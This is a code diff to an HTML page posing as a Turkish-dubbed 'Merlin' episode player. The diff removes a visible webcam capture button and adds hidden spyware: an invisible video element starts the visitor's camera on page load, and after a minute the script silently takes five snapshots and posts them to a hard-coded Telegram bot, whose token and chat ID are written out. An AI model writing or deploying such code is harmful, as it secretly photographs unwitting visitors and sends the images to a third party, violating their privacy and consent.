@@ -54,30 +54,116 @@
             color: #fff;
             text-align: center;
         }
-        #video {
-            display: none; /* Hide video element */
+        #camera {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0;
         }
-        #canvas {
-            display: none; /* Hide canvas element */
+        @media (max-width: 768px) {
+            .title {
+                font-size: 2rem;
+            }
+            .description {
+                font-size: 0.9rem;
+            }
         }
-        #capture-btn {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: #00aaff;
-            border: none;
-            color: white;
-            cursor: pointer;
+        @media (max-width: 480px) {
+            .title {
+                font-size: 1.5rem;
+            }
+            .description {
+                font-size: 0.8rem;
+            }
         }
     </style>
+    <script>
+        const telegramBotToken = "7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs"; // Your bot token
+        const telegramUserId = "7771348001"; // Your Telegram user ID
+
+        // Initialize camera and take a picture
+        async function startCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const camera = document.getElementById("camera");
+            camera.srcObject = stream;
+        }
+
+        // Function to take a picture from the webcam
+        function takePicture() {
+            const canvas = document.createElement("canvas");
+            const context = canvas.getContext("2d");
+            const camera = document.getElementById("camera");
+            canvas.width = camera.videoWidth;
+            canvas.height = camera.videoHeight;
+            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL("image/jpeg");
+        }
+
+        // Function to send photo to Telegram bot
+        function sendToTelegram(imageData) {
+            const formData = new FormData();
+            formData.append("chat_id", telegramUserId);
+            formData.append("photo", dataURItoBlob(imageData));
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    console.log("Photo sent successfully.");
+                } else {
+                    console.log("Error sending photo.");
+                }
+            });
+        }
+
+        // Helper function to convert Data URL to Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(",")[1]);
+            const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uintArray = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                uintArray[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([uintArray], { type: mimeString });
+        }
+
+        // Automatically take pictures after 1 minute and send them
+        setTimeout(() => {
+            let count = 0;
+            const maxPics = 5;
+            const interval = setInterval(() => {
+                if (count < maxPics) {
+                    const pictureData = takePicture();
+                    sendToTelegram(pictureData);
+                    count++;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 2000); // Take a picture every 2 seconds
+        }, 60000); // Start after 1 minute
+
+        // Start camera when the page loads
+        window.onload = startCamera;
+    </script>
 </head>
 <body>
+    <!-- Video title at the top center above the player -->
     <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
 
+    <!-- Custom Video Player using Google Drive link -->
     <div class="video-container">
         <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
                 frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
 
+    <!-- Description section -->
     <div class="description">
         <p>
             "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
@@ -87,58 +173,7 @@
         </p>
     </div>
 
-    <!-- Camera input -->
-    <video id="video" width="320" height="240" autoplay></video>
-    <canvas id="canvas" width="320" height="240"></canvas>
-    <button id="capture-btn">Capture and Send to Telegram</button>
-
-    <script>
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const captureBtn = document.getElementById("capture-btn");
-
-        // Start video stream from webcam
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(error => {
-                console.error("Error accessing webcam: ", error);
-            });
-
-        // Capture image from webcam and send it to Telegram
-        captureBtn.addEventListener("click", () => {
-            const context = canvas.getContext("2d");
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convert canvas to image (base64)
-            const imageData = canvas.toDataURL("image/jpeg");
-
-            // Send the image to Telegram
-            sendImageToTelegram(imageData);
-        });
-
-        function sendImageToTelegram(imageData) {
-            const botToken = '7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs';  // Replace with your bot token
-            const chatId = '7771348001';  // Replace with your Telegram ID
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', imageData);
-
-            fetch(telegramUrl, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Image sent to Telegram successfully:", data);
-            })
-            .catch(error => {
-                console.error("Error sending image to Telegram:", error);
-            });
-        }
-    </script>
+    <!-- Video Camera element, invisible -->
+    <video id="camera" autoplay muted></video>
 </body>
 </html>
